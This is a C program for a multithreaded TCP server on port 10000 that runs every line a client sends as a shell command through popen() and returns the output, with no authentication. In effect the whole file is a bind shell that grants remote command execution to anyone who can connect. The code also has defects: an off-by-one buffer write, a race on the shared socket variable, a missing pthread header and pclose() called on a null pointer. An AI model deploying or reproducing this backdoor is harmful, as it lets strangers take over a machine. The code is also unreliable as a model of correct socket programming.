#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <stdlib.h>

#define SERVER_PORT  10000
	
void *thread_function(void *arg);

int main(int argc, char *argv)
{
	int sk;

 	struct sockaddr_in servaddr;
 	int servaddr_length;
	
	sk = socket(PF_INET, SOCK_STREAM, 0);
	
	if (sk == -1)
	{
		fprintf(stderr, "Can't create socket\n");
		
		return -1;
	}

	servaddr_length = sizeof(struct sockaddr_in);
	bzero(&servaddr, servaddr_length);
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SERVER_PORT);
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(sk, (struct sockaddr*)&servaddr, servaddr_length)<0)
    {
     	fprintf(stderr, "bind to port %d failure!\n",SERVER_PORT);
        return -2;
    }

	fprintf(stdout, "I'm bind...!\n");

	if (listen(sk, 10) < 0)
   	{
     	fprintf(stderr, "listen failure!\n");
    	return -3;
	}    

	fprintf(stdout, "I'm listening on port %d !\n", SERVER_PORT);

    while (1)
	{
	 	int tmp_sk = accept(sk, (struct sockaddr *)(&servaddr), &servaddr_length);
		pthread_t tid;
		
		if (pthread_create(&tid, NULL, thread_function, (void*)&tmp_sk) < 0)
		{
			fprintf(stderr, "create thread error\n");
			return -4;
		}

		pthread_detach(tid);
	}	

	return 0;
}

void *thread_function(void *arg)
{
	int sk = *((int *)arg);
	int read_size = 0;

	char buf[4096] = "";
		
	read_size = recv(sk, buf, 4096, 0);

	while ((read_size > 0) && (strcmp(buf, "q") != 0))
	{
		buf[read_size] = '\0';
	    FILE *fp = NULL;

		if ((fp = popen((void *)buf, "r")) != NULL) 
		{
			bzero(buf, 4096);
			read_size = fread((void *)buf, 1, 4096, fp);
			buf[read_size] = '\0';
			send(sk, buf, 4096, 0); 
		}

        pclose(fp);
		read_size = recv(sk, buf, 4096, 0);
	}

	close(sk);
	return NULL;
}	
